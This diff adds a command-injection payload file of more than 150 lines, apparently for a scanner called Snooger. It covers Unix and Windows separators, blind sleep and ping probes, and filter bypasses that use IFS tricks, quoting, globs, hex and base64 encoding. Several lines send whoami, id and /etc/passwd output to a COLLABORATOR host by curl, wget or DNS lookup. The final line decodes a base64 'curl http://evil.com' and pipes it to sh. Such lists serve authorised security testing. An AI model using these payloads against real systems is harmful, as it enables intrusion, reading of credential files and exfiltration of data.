@@ -1,0 +1,165 @@
+# Snooger Command Injection Payloads — 150+ real payloads
+# Categories: Unix, Windows, Separators, Bypass, Encoding, Blind
+# =============================================================
+
+# === Unix Command Separators ===
+;id
+;ls
+;whoami
+;cat /etc/passwd
+|id
+|ls
+|whoami
+|cat /etc/passwd
+||id
+||ls
+||whoami
+`id`
+`whoami`
+`cat /etc/passwd`
+$(id)
+$(whoami)
+$(cat /etc/passwd)
+&id
+&ls
+&whoami
+&&id
+&&ls
+&&whoami
+;id;
+|id|
+||id||
+`id`
+$(id)
+;id #
+|id #
+||id #
+;id //
+|id //
+
+# === Newline / Null Byte Injection ===
+%0aid
+%0awhoami
+%0als
+%0d%0aid
+%0d%0awhoami
+%00id
+%00;id
+%0a id
+%0d id
+id%0a
+whoami%0a
+\nid
+\n whoami
+\r\nid
+
+# === Unix Blind Detection ===
+;sleep 5
+|sleep 5
+||sleep 5
+`sleep 5`
+$(sleep 5)
+& sleep 5
+&& sleep 5
+;sleep 5;
+;ping -c 5 127.0.0.1;
+|ping -c 5 127.0.0.1
+$(ping -c 5 127.0.0.1)
+`ping -c 5 127.0.0.1`
+& ping -c 5 127.0.0.1 &
+
+# === Unix Space Bypass ===
+;{id}
+;${IFS}id
+;id${IFS}
+;cat${IFS}/etc/passwd
+;cat$IFS/etc/passwd
+;cat</etc/passwd
+;cat${IFS}${IFS}/etc/passwd
+X=$'cat\x20/etc/passwd'&&$X
+X=$'id'&&$X
+;echo${IFS}test
+IFS=,;`cat<<<id`
+{cat,/etc/passwd}
+cat${IFS}/etc${IFS}/passwd
+;cat%09/etc/passwd
+;cat%20/etc/passwd
+
+# === Unix Filter Bypass ===
+;c'a't /etc/passwd
+;c"a"t /etc/passwd
+;c\at /etc/passwd
+;ca$@t /etc/passwd
+;/bin/cat /etc/passwd
+;/???/c?t /etc/passwd
+;/???/c?t /???/p??s??
+;/???/?at /???/??ss??
+;w'h'o'a'm'i
+;w"h"oami
+;wh$@oami
+;who$*ami
+;who${not_exist}ami
+;$(printf '\x69\x64')
+;$(printf '\151\144')
+;hex_val=$(printf '\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64');$hex_val
+;echo d2hvYW1p|base64 -d|sh
+;bash<<<$(base64 -d<<<aWQ=)
+;echo aWQ=|base64 -d|bash
+
+# === Unix Wildcard/Glob ===
+;c?t /etc/passwd
+;ca? /etc/passwd
+;c*t /etc/passwd
+;/bin/c?t /etc/passwd
+;/b?n/c?t /etc/passwd
+;/b?n/ca? /etc/passwd
+;cat /e?c/p?sswd
+;cat /e*c/p*wd
+
+# === Windows Command Separators ===
+& whoami
+&& whoami
+| whoami
+|| whoami
+; whoami
+%0a whoami
+`whoami`
+& dir
+& type c:\windows\win.ini
+| type c:\windows\win.ini
+
+# === Windows Blind Detection ===
+& ping -n 5 127.0.0.1
+| ping -n 5 127.0.0.1
+|| ping -n 5 127.0.0.1
+& timeout /t 5
+&& timeout /t 5
+
+# === Windows Filter Bypass ===
+& w^h^o^a^m^i
+& who""ami
+& w""ho""ami
+& wh%COMSPEC:~-7,1%ami
+& set a=who&& set b=ami&& call %a%%b%
+& cmd /c whoami
+& cmd /c "whoami"
+& powershell whoami
+& powershell -c "whoami"
+& C:\Windows\System32\cmd.exe /c whoami
+
+# === OOB Exfiltration ===
+;curl http://COLLABORATOR/?data=$(whoami)
+;wget http://COLLABORATOR/?data=$(id)
+;nslookup $(whoami).COLLABORATOR
+;dig $(whoami).COLLABORATOR
+;host $(id).COLLABORATOR
+;ping -c 1 $(whoami).COLLABORATOR
+;curl http://COLLABORATOR/$(cat /etc/passwd | base64)
+$(curl http://COLLABORATOR/?d=$(id|base64))
+`nslookup \`whoami\`.COLLABORATOR`
+
+# === Chained Commands ===
+;id;uname -a;whoami
+;id && uname -a && whoami
+;echo START;id;echo END
+;echo Y3VybCBodHRwOi8vZXZpbC5jb20=|base64 -d|sh
